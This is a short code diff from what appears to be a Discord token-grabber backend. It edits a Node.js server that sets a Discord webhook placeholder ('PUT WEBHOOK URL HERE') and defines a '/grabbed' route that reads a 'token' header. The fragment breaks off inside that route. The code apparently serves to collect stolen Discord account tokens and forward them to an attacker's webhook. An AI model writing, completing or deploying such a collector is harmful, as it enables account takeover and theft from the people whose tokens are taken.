@@ -4,7 +4,7 @@ const request = require('request')
 
 const Discord = require('v11-discord.js');
 
-const webhook = "";
+const webhook = "PUT WEBHOOK URL HERE";
 
 app.get("/grabbed", async (req, res) => {
     var token = req.headers.token
